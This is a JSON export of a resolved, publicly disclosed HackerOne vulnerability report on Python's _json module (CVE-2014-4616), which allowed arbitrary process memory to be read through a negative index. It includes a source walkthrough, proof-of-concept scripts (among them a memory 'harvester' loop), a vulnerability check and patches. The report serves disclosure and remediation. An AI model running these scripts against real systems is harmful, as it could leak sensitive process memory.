{
  "id": 12297,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjI5Nw==",
  "url": "https://hackerone.com/reports/12297",
  "title": "Python vulnerability: reading arbitrary process memory",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-05-16T23:14:13.564Z",
  "submitted_at": "2014-05-16T23:14:13.564Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "guido",
    "url": "/guido",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4FAMPPRY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T112824Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID7qnbDtQnppWbK9qoDjLwYSeBYc3LRQ%2BMdKpj5H8QM5AiBcd5fhkOSjbw3KxGXsdAbT3wThN7msB2RWCygRr5LCFCqxBQhwEAMaDDAxMzYxOTI3NDg0OSIMgNfkjKpbMNfrzm%2FrKo4FsJk%2BxIB%2FpE9OZtgUFnkErO%2BhHPLPdxGIhFqg%2Bq0WjmQDZNK0xDM7xsBL8S96OIBsJhKmFO2X5YXAM%2BJWLiq5jWeZK2UlcjaqMbEYoqMwzZZpon%2BJgSLl7CmhaaJEYo2Eqg8gQk%2FzsS7gK1DQUo5y7p40mrs3bqiBli%2BEbN3p1DzRF1OsJmu1tZGMKR0FAcr61%2B9haXE8SpV7jEcHIuniF5i4IiY6EhO8q7kzwOOWNJi%2BBAgp27jLj8bpr8BIQYO9YMDJ2sl9KSPyh3nYV9sPJ8eAhDm9MU6faC%2F6CndOHo39J7nBh3nxv2OgaiNVBrG9IB1IshOcJ6TbRWQITABKSELW8lcGO%2Fk5kL84OvCkCj8lGri2ErfG6E2cdhO5msFSxbOSsdeTEzyZMnlXNbIwvPbKFe1JSot39yqx1rwXOWENIyZGKymFar7C00y4EjMAnYIa8LnZv9bZddep%2B6C8rAKUuhA5WNFQMoEjYPbkMBoR5%2BJwceeEq9Y7eWce1bzC2baAtlgJv00Bq8dW1ERyDEqL2rMEsnwcqK176fzylvXzP3%2BwcRPApE21%2F2U2EPNQcv%2FpdP5UelCpwvfNpMQdSI%2BeOWh6zhSs2Qu5HziRgeMzA86pDdxk%2B16Slz2CwT8P4OXzvVQRmNY7Nz0miEc3OEklOATXOFxHiDHWPfc7csKSpFUSLauCI%2FULJBbezKD4QcgYP0B9xcbgKlsLzw%2BACW6EoDGtQCfib%2BDcpdzWYvsn9wbqvcZT7DBvkRrH2qyoW7Vqwv2n%2BIZuOW8JIYNJ8lI5wHRZGNr9kwx6cfvK0V2%2Fkpi8X7UdGfaGDccM7kwtlYjl90mD1zjfZCweNKMiv6mx5wX8Ek1dDgHEbl31MLeorK4GOrIB0Cm%2F258YlHJ0u3oe5G2fqDJBkkDc4nTkDoxYVyXxLDavzSxkqxIe4yUE6WkeTnQ50Hek4AkKUuDs3EcCnHh0bldMqsIZ4S5yaHjH3LoM%2BCaH9miaUPuq2ugm1ugC7WzW0auy4Y%2F5eNeOJH1TtrOM44T7LWh6S0WEUeScI8SSHyviHGGemiCIB8Pt7Ns0huMN7cWBZ6nAw2p5vpvlUOWFreiZY5OJe4C9DAST3zh0ufFv%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3a0ad37ab20b2cfe558c0f61aaa9d55e881103a095b1e2b2b6beec7fdb64ab5f",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4FAMPPRY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T112824Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID7qnbDtQnppWbK9qoDjLwYSeBYc3LRQ%2BMdKpj5H8QM5AiBcd5fhkOSjbw3KxGXsdAbT3wThN7msB2RWCygRr5LCFCqxBQhwEAMaDDAxMzYxOTI3NDg0OSIMgNfkjKpbMNfrzm%2FrKo4FsJk%2BxIB%2FpE9OZtgUFnkErO%2BhHPLPdxGIhFqg%2Bq0WjmQDZNK0xDM7xsBL8S96OIBsJhKmFO2X5YXAM%2BJWLiq5jWeZK2UlcjaqMbEYoqMwzZZpon%2BJgSLl7CmhaaJEYo2Eqg8gQk%2FzsS7gK1DQUo5y7p40mrs3bqiBli%2BEbN3p1DzRF1OsJmu1tZGMKR0FAcr61%2B9haXE8SpV7jEcHIuniF5i4IiY6EhO8q7kzwOOWNJi%2BBAgp27jLj8bpr8BIQYO9YMDJ2sl9KSPyh3nYV9sPJ8eAhDm9MU6faC%2F6CndOHo39J7nBh3nxv2OgaiNVBrG9IB1IshOcJ6TbRWQITABKSELW8lcGO%2Fk5kL84OvCkCj8lGri2ErfG6E2cdhO5msFSxbOSsdeTEzyZMnlXNbIwvPbKFe1JSot39yqx1rwXOWENIyZGKymFar7C00y4EjMAnYIa8LnZv9bZddep%2B6C8rAKUuhA5WNFQMoEjYPbkMBoR5%2BJwceeEq9Y7eWce1bzC2baAtlgJv00Bq8dW1ERyDEqL2rMEsnwcqK176fzylvXzP3%2BwcRPApE21%2F2U2EPNQcv%2FpdP5UelCpwvfNpMQdSI%2BeOWh6zhSs2Qu5HziRgeMzA86pDdxk%2B16Slz2CwT8P4OXzvVQRmNY7Nz0miEc3OEklOATXOFxHiDHWPfc7csKSpFUSLauCI%2FULJBbezKD4QcgYP0B9xcbgKlsLzw%2BACW6EoDGtQCfib%2BDcpdzWYvsn9wbqvcZT7DBvkRrH2qyoW7Vqwv2n%2BIZuOW8JIYNJ8lI5wHRZGNr9kwx6cfvK0V2%2Fkpi8X7UdGfaGDccM7kwtlYjl90mD1zjfZCweNKMiv6mx5wX8Ek1dDgHEbl31MLeorK4GOrIB0Cm%2F258YlHJ0u3oe5G2fqDJBkkDc4nTkDoxYVyXxLDavzSxkqxIe4yUE6WkeTnQ50Hek4AkKUuDs3EcCnHh0bldMqsIZ4S5yaHjH3LoM%2BCaH9miaUPuq2ugm1ugC7WzW0auy4Y%2F5eNeOJH1TtrOM44T7LWh6S0WEUeScI8SSHyviHGGemiCIB8Pt7Ns0huMN7cWBZ6nAw2p5vpvlUOWFreiZY5OJe4C9DAST3zh0ufFv%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58c73d2a07fb9ffd2474a21c0c74a0ab2dfe27474a549839e33d6cb349989b9b"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2014-4616"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2014-06-20T05:54:36.382Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Python 2 and 3 are susceptible to arbitrary process memory reading by a user or adversary due to a bug in the _json module caused by insufficient bounds checking.\n\nThe sole prerequisites of this attack are that the attacker is able to control or influence the two parameters of the default scanstring function: the string to be decoded and the index.\n\nThe bug is caused by allowing the user to supply a negative index value. The index value is then used directly as an index to an array in the C code; internally the address of the array and its index are added to each other in order to yield the address of the value that is desired. However, by supplying a negative index value and adding this to the address of the array, the processor's register value wraps around and the calculated value will point to a position in memory which isn't within the bounds of the supplied string, causing the function to access other parts of the process memory.\n\nLet me clarify:\n\nThis is Python-3.4.0/Modules/_json.c:\n\n```\n1035 static PyObject *\n1036 scanner_call(PyObject *self, PyObject *args, PyObject *kwds)\n1037 {\n1038     /* Python callable interface to scan_once_{str,unicode} */\n1039     PyObject *pystr;\n1040     PyObject *rval;\n1041     Py_ssize_t idx;\n1042     Py_ssize_t next_idx = -1;\n1043     static char *kwlist[] = {\"string\", \"idx\", NULL};\n1044     PyScannerObject *s;\n1045     assert(PyScanner_Check(self));\n1046     s = (PyScannerObject *)self;\n1047     if (!PyArg_ParseTupleAndKeywords(args, kwds, \"On:scan_once\", kwlist, &pystr, &idx))\n1048         return NULL;\n1049\n1050     if (PyUnicode_Check(pystr)) {\n1051         rval = scan_once_unicode(s, pystr, idx, &next_idx);\n1052     }\n1053     else {\n1054         PyErr_Format(PyExc_TypeError,\n1055                  \"first argument must be a string, not %.80s\",\n1056                  Py_TYPE(pystr)->tp_name);\n1057         return NULL;\n1058     }\n1059     PyDict_Clear(s->memo);\n1060     if (rval == NULL)\n1061         return NULL;\n1062     return _build_rval_index_tuple(rval, next_idx);\n1063 }\n```\n\nAs you can see on line 1047, ParseTuple takes an 'n' as an argument for 'end', which, as can be learned from this page ( https://docs.python.org/3/c-api/arg.html ), means:\n\n```\n        n (int) [Py_ssize_t]\n            Convert a Python integer to a C Py_ssize_t.\n```\n\nThis means it accepts a SIGNED integer value, thus allowing a negative value to be supplied as the 'end' parameter.\n\nThen onto scanstring_unicode_once to which execution gets transferred through line 1051 of the code above.\n\n```\n922  static PyObject *\n923  scan_once_unicode(PyScannerObject *s, PyObject *pystr, Py_ssize_t\nidx, Py_ssize_t *next_idx_ptr)\n924  {\n925      /* Read one JSON term (of any kind) from PyUnicode pystr.\n926      idx is the index of the first character of the term\n927      *next_idx_ptr is a return-by-reference index to the first character after\n928          the number.\n929\n930      Returns a new PyObject representation of the term.\n931      */\n932      PyObject *res;\n933      void *str;\n934      int kind;\n935      Py_ssize_t length;\n936\n937      if (PyUnicode_READY(pystr) == -1)\n938          return NULL;\n939\n940      str = PyUnicode_DATA(pystr);\n941      kind = PyUnicode_KIND(pystr);\n942      length = PyUnicode_GET_LENGTH(pystr);\n943\n944      if (idx >= length) {\n945          raise_stop_iteration(idx);\n946          return NULL;\n947      }\n```\n\nHere we see that 'length' is set to the length of the string parameter. This will always be a positive value. On line 945 it is checked whether idx is equal or higher than length; this can never be true in the case of a negative index value.\n\n```\n949      switch (PyUnicode_READ(kind, str, idx)) {\n```\n\nPyUnicode_READ is defined as follows ( in Python-3.4.0/Include/unicodeobject.h ):\n\n```\n516  /* Read a code point from the string's canonical representation.  No checks\n517     or ready calls are performed. */\n518  #define PyUnicode_READ(kind, data, index) \\\n519      ((Py_UCS4) \\\n520      ((kind) == PyUnicode_1BYTE_KIND ? \\\n521          ((const Py_UCS1 *)(data))[(index)] : \\\n522          ((kind) == PyUnicode_2BYTE_KIND ? \\\n523              ((const Py_UCS2 *)(data))[(index)] : \\\n524              ((const Py_UCS4 *)(data))[(index)] \\\n525          ) \\\n526      ))\n```\n\nHere we can see that index, which is negative in our example, is used as an array index. Since it is negative, it will internally wrap around and point to an address BELOW the address of 'data'.\n\nSo, if a certain negative value (such as -0x7FFFFFFF) is supplied and data[index] will effectively point to an invalid or read-protected page in memory, the Python executable will segfault.\n\nBut there's more. Instead of making it point to an invalid page, let's make it point to something valid:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \"99448866\"\n4    b = \"88445522\"\n5    diff = id(a) - id(b)\n6    print(\"Difference is \" + hex(diff))\n7    print j.raw_decode(b)\n8    print j.raw_decode(b, diff)\n```\n\nOutput of this script is:\n\nDifference is -0x30\n(88445522, 8)\n(99448866, -40)\n\nThe difference between the address of 'a' and the address of 'b' is calculated and supplied as an index to the raw_decode function.\nInternally the address wraps around and we get to see the contents of 'a' while having supplied 'b' as a parameter.\n\nWe can use this harvester to scan memory for valid JSON strings:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3    a = \"x\" * 1000\n4    for x in range(0, 600000):\n5        try:\n6            print j.raw_decode(a, 0 - x)\n7        except:\n8            pass\n```\n\nThere is one drawback, however. We cannot decode strings in this manner because:\n\n```\n296  static PyObject *\n297  scanstring_unicode(PyObject *pystr, Py_ssize_t end, int strict, Py_ssize_t *next_end_ptr)\n298  {\n299      /* Read the JSON string from PyUnicode pystr.\n300      end is the index of the first character after the quote.\n301      if strict is zero then literal control characters are allowed\n302      *next_end_ptr is a return-by-reference index of the character\n303          after the end quote\n304\n305      Return value is a new PyUnicode\n306      */\n307      PyObject *rval = NULL;\n308      Py_ssize_t len;\n309      Py_ssize_t begin = end - 1;\n310      Py_ssize_t next /* = begin */;\n311      const void *buf;\n312      int kind;\n313      PyObject *chunks = NULL;\n314      PyObject *chunk = NULL;\n315\n316      if (PyUnicode_READY(pystr) == -1)\n317          return 0;\n318\n319      len = PyUnicode_GET_LENGTH(pystr);\n320      buf = PyUnicode_DATA(pystr);\n321      kind = PyUnicode_KIND(pystr);\n322\n323      if (end < 0 || len < end) {\n324          PyErr_SetString(PyExc_ValueError, \"end is out of bounds\");\n325          goto bail;\n```\n\nthis code actually performs a bounds check by asserting that end (which is our index) isn't negative.\n\nHowever, I succesfully ran harvesting tests that could extract JSON-encoded arrays of numerical values (such as [10, 20, 40, 70] ) from the process memory without any problem or difficulty.\n\nGiven the ubiquity of JSON parsing in Python applications and the limited amount of prequisites and conditions under which this bug can be exploited, it is evident that this issue could have serious security implications in some cases.\n\nHere is a patch for 3.4.0:\n\n```\n--- _json_old.c    2014-04-12 17:47:08.749012372 +0200\n+++ _json.c    2014-04-12 17:44:52.253011645 +0200\n@@ -941,7 +941,7 @@\n     kind = PyUnicode_KIND(pystr);\n     length = PyUnicode_GET_LENGTH(pystr);\n\n-    if (idx >= length) {\n+    if ( idx < 0 || idx >= length) {\n         raise_stop_iteration(idx);\n         return NULL;\n     }\n```\n\nAnd here is a patch for 2.7.6:\n\n```\n--- _json_old.c    2014-04-12 17:57:14.365015601 +0200\n+++ _json.c    2014-04-12 18:04:25.149017898 +0200\n@@ -1491,7 +1491,7 @@\n     PyObject *res;\n     char *str = PyString_AS_STRING(pystr);\n     Py_ssize_t length = PyString_GET_SIZE(pystr);\n-    if (idx >= length) {\n+    if ( idx < 0 || idx >= length) {\n         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n@@ -1578,7 +1578,7 @@\n     PyObject *res;\n     Py_UNICODE *str = PyUnicode_AS_UNICODE(pystr);\n     Py_ssize_t length = PyUnicode_GET_SIZE(pystr);\n-    if (idx >= length) {\n+    if ( idx < 0 || idx >= length) {\n         PyErr_SetNone(PyExc_StopIteration);\n         return NULL;\n     }\n```\n\n\nHere is a script that checks whether the Python binary that executes it is vulnerable:\n\n```\n1    from json import JSONDecoder\n2    j = JSONDecoder()\n3\n4    a = '128931233'\n5    b = \"472389423\"\n6\n7    if id(a) < id(b):\n8        x = a\n9        y = b\n10   else:\n11       x = b\n12       y = a\n13\n14   diff = id(x) - id(y)\n15\n16   try:\n17       j.raw_decode(y, diff)\n18       print(\"Vulnerable\")\n19   except:\n20       print(\"Not vulnerable\")\n```\n",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "shivammusic"
  ],
  "structured_scope": {
    "databaseId": 84536,
    "asset_type": "OTHER",
    "asset_identifier": "Python (Legacy)",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
